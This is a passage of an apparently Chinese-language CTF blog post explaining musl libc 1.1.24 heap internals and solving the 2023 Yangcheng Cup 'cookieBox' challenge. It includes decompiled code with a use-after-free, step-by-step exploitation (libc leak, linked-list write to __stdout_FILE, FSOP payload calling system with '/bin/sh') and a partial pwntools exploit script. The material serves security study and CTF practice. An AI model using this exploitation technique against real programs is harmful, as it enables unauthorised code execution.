<h4 id="bin-chunk"><a href="#bin-chunk" class="headerlink" title="__bin_chunk"></a>__bin_chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __bin_chunk(<span class="keyword">struct</span> chunk *self)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">	<span class="type">size_t</span> final_size, new_size, size;</span><br><span class="line">	<span class="type">int</span> reclaim=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小</span></span><br><span class="line">	final_size = new_size = CHUNK_SIZE(self);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果下一个 chunk 的 psize 位不等于 self 的 csize，则程序 crash</span></span><br><span class="line">	<span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 检查 self 前后是否有空闲 chunk</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">            <span class="comment">// 去除 INUSE 位</span></span><br><span class="line">			self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">			next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">            <span class="comment">// 计算 final_size 对应下标</span></span><br><span class="line">			i = bin_index(final_size);</span><br><span class="line">			lock_bin(i);</span><br><span class="line">			lock(mal.free_lock);</span><br><span class="line">			<span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">				<span class="keyword">break</span>;	<span class="comment">//退出循环</span></span><br><span class="line">			unlock(mal.free_lock);</span><br><span class="line">			unlock_bin(i);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 向前合并空闲的 chunk</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">			self = PREV_CHUNK(self);</span><br><span class="line">			size = CHUNK_SIZE(self);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向后合并空闲的 chunk</span></span><br><span class="line">		<span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">			size = CHUNK_SIZE(next);</span><br><span class="line">			final_size += size;</span><br><span class="line">			<span class="keyword">if</span> (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)</span><br><span class="line">				reclaim = <span class="number">1</span>;</span><br><span class="line">			next = NEXT_CHUNK(next);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 2. 在 binmap 中，将 bin i 设为非空 bin</span></span><br><span class="line">	<span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span>&lt;&lt;i))</span><br><span class="line">		a_or_64(&amp;mal.binmap, <span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line"></span><br><span class="line">	self-&gt;csize = final_size;</span><br><span class="line">	next-&gt;psize = final_size;</span><br><span class="line">	unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将 self 加入到 bin i 对应链表的尾部</span></span><br><span class="line">	self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">	self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">	self-&gt;next-&gt;prev = self;</span><br><span class="line">	self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">	<span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">		<span class="type">uintptr_t</span> a = (<span class="type">uintptr_t</span>)self + SIZE_ALIGN+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="type">uintptr_t</span> b = (<span class="type">uintptr_t</span>)next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">		__madvise((<span class="type">void</span> *)a, b-a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		__mmap((<span class="type">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unlock_bin(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    __bin_chunk 的功能是将 chunk 插入到 bin 链表中，首先合并 chunk 前后的空闲 chunk，设置 binmap 和 chunk 标志位，最后将 chunk 插入到 bin 链表中。</p>
<h3 id="2-4-静态堆内存初始化"><a href="#2-4-静态堆内存初始化" class="headerlink" title="2-4 静态堆内存初始化"></a>2-4 静态堆内存初始化</h3><p>​    在 glibc 中，堆一般位于内存中的动态内存区域，而 musl libc 堆管理器为了减少内存开销，将程序和 libc 库（静态内存）的空闲内存划分为堆内存，并<strong>优先使用静态堆内存</strong>来分配 chunk。只有当静态堆内存耗尽或无法满足需求时，musl libc 才会去申请动态内存。</p>
<p>​    该特性有助于漏洞利用过程中的<strong>信息泄露</strong>，往往可以得到 libc 或是程序基址信息。</p>
<h4 id="dls3"><a href="#dls3" class="headerlink" title="__dls3"></a>__dls3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __dls3(<span class="type">size_t</span> *sp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ....</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">	reclaim_gaps(&amp;app);</span><br><span class="line">	reclaim_gaps(&amp;ldso);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	....</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    源代码很长，关键在于 reclaim_gaps 这个函数。</p>
<h4 id="reclaim-gaps-amp-reclaim"><a href="#reclaim-gaps-amp-reclaim" class="headerlink" title="reclaim_gaps &amp; reclaim"></a>reclaim_gaps &amp; reclaim</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reclaim</span><span class="params">(<span class="keyword">struct</span> dso *dso, <span class="type">size_t</span> start, <span class="type">size_t</span> end)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 避开 RELRO 段</span></span><br><span class="line">	<span class="keyword">if</span> (start &gt;= dso-&gt;relro_start &amp;&amp; start &lt; dso-&gt;relro_end) start = dso-&gt;relro_end;</span><br><span class="line">	<span class="keyword">if</span> (end   &gt;= dso-&gt;relro_start &amp;&amp; end   &lt; dso-&gt;relro_end) end = dso-&gt;relro_start;</span><br><span class="line">	<span class="keyword">if</span> (start &gt;= end) <span class="keyword">return</span>;</span><br><span class="line">	<span class="type">char</span> *base = laddr_pg(dso, start);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用 __malloc_donate 函数将内存释放到 bin 中</span></span><br><span class="line">	__malloc_donate(base, base+(end-start));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reclaim_gaps</span><span class="params">(<span class="keyword">struct</span> dso *dso)</span></span><br><span class="line">&#123;</span><br><span class="line">	Phdr *ph = dso-&gt;phdr;</span><br><span class="line">	<span class="type">size_t</span> phcnt = dso-&gt;phnum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历每一个段</span></span><br><span class="line">	<span class="keyword">for</span> (; phcnt--; ph=(<span class="type">void</span> *)((<span class="type">char</span> *)ph+dso-&gt;phentsize)) &#123;</span><br><span class="line">        <span class="comment">// 条件1：段不属于可加载段（PT_LOAD）</span></span><br><span class="line">		<span class="keyword">if</span> (ph-&gt;p_type!=PT_LOAD) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 条件2：段可读可写</span></span><br><span class="line">		<span class="keyword">if</span> ((ph-&gt;p_flags&amp;(PF_R|PF_W))!=(PF_R|PF_W)) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 在段所属内存页中，将段的前后空闲内存传递给 reclaim 函数</span></span><br><span class="line">		reclaim(dso, ph-&gt;p_vaddr &amp; -PAGE_SIZE, ph-&gt;p_vaddr);</span><br><span class="line">		reclaim(dso, ph-&gt;p_vaddr+ph-&gt;p_memsz,</span><br><span class="line">			ph-&gt;p_vaddr+ph-&gt;p_memsz+PAGE_SIZE<span class="number">-1</span> &amp; -PAGE_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    reclaim_gaps 函数通过遍历每个内存段，找到符合条件的段，计算其所属内存页，最后通过 __malloc_donate 将页中的空闲内存释放到 bin 中。</p>
<h2 id="3-漏洞利用手法"><a href="#3-漏洞利用手法" class="headerlink" title="3 漏洞利用手法"></a>3 漏洞利用手法</h2><p>​    由于在 musl libc 中没有像 glibc 中那样的 hook 指针来调用，所以一般用到的都是 FSOP 即覆盖 FILE 结构体中的某些指针来劫持控制流。</p>
<p>​    详细的利用手法以后遇到例题再总结上来。</p>
<h2 id="4-例题"><a href="#4-例题" class="headerlink" title="4 例题"></a>4 例题</h2><h4 id="例题信息"><a href="#例题信息" class="headerlink" title="例题信息"></a>例题信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">来源：2023羊城杯初赛-cookieBox</span><br><span class="line">libc版本：musl libc 1.1.24</span><br><span class="line">漏洞：UAF</span><br><span class="line">限制：堆块大小 &lt;= 0x100</span><br><span class="line">     size 和 chunk 以相同 idx 同时布置在 bss 上，释放堆块会清空 size，edit 和 show 功能会对 size 进行检测。</span><br></pre></td></tr></table></figure>

<p>ADD</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_400A50</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the size:&quot;</span>);</span><br><span class="line">  *size = input_number();		<span class="comment">// 输入大小</span></span><br><span class="line">  <span class="keyword">if</span> ( size[<span class="number">0</span>] &gt; <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *&amp;size[<span class="number">1</span>] = <span class="built_in">malloc</span>(size[<span class="number">0</span>]);	<span class="comment">// 分配内存</span></span><br><span class="line">  <span class="keyword">if</span> ( !*&amp;size[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the Content:&quot;</span>);</span><br><span class="line">  result = read(<span class="number">0</span>, *&amp;size[<span class="number">1</span>], size[<span class="number">0</span>]);	<span class="comment">// 往堆内存读取数据</span></span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )	<span class="comment">// 遍历 bss 段</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (&amp;buf)[i];</span><br><span class="line">    <span class="keyword">if</span> ( !result )	<span class="comment">// 寻找空的内存用于存储堆指针</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = *(&amp;nbytes + i);</span><br><span class="line">      <span class="keyword">if</span> ( !result )	<span class="comment">// 寻找空的内存用于存储堆大小</span></span><br><span class="line">      &#123;</span><br><span class="line">        (&amp;buf)[i] = *&amp;size[<span class="number">1</span>];		<span class="comment">// 只有找到两个 index 相同为空才进行设置</span></span><br><span class="line">        *(&amp;nbytes + i) = size[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DELETE</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400B69</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !(&amp;buf)[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>((&amp;buf)[v1]);		<span class="comment">// UAF</span></span><br><span class="line">  *(&amp;nbytes + v1) = <span class="number">0</span>;	<span class="comment">// 只清空 bss 上相应的堆 size，而未清空对应指针</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EDIT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400C59</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; (&amp;buf)[v1] &amp;&amp; *(&amp;nbytes + v1) )	<span class="comment">// 检查 bss 上对应的堆指针和堆 size</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input the content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (&amp;buf)[v1], *(&amp;nbytes + v1));	<span class="comment">// 根据 bss 上堆 size 读取数据</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>SHOW</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400BE1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the idx:&quot;</span>);</span><br><span class="line">  v1 = input_number();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !(&amp;buf)[v1] || !*(&amp;nbytes + v1) )	<span class="comment">// 同样会检测堆指针和堆 size</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Idx Error&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>((&amp;buf)[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>调试命令：<code>p/x mal</code>可以查看 mal 堆管理器。</p>
<ol>
<li><p>由于静态堆内存初试化后，打开 gdb调试发现，bin 中已有一些 chunk（一个在程序段上，一个在libc上），且 idx &gt; 32，不知为何需要申请 4 次才能申请完（不应该是 2 次吗？不过对做题没有影响）。</p>
<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309041212424.png" alt="image-20230904121226225" style="zoom:67%;" /></li>
<li><p>由于静态堆初始化，因此很容易就可以泄露出 libc 基址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br></pre></td></tr></table></figure></li>
<li><p>利用 uaf 实现两个指针指向同一个堆（目标堆），一个用于 free，一个用于 edit，</p>
<p>再释放一个堆使得目标堆和该堆处于同一 bin 中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#4(1)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>修改目标堆的 next 指针指向 __stdout_FILE，</p>
<p>修改其 prev 指针指向目标地址 addr-0x10,</p>
<p>再申请一个堆，达到 attack，向 addr 中写入__stdout_FILE，</p>
<p>这里的 addr 即为 bss 上的 idx2 对应的堆指针。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>, p64(stdout) + p64(<span class="number">0x602070</span>-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>修改目标堆指针，即修改 __stdout_FILE 结构体，通过 puts 触发链子，打其他 FILE 链子的时候可能需要保证 <code>wpos != wbase</code>。</p>
<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309041226665.png" alt="image-20230904122654594" style="zoom:50%;" />

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>还有一种解题思路就是在 attack 时改 addr 为 mal 上的对应的 bin结构体，修改其 head，也能申请到对应内存。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./cookieBox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the size:\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span 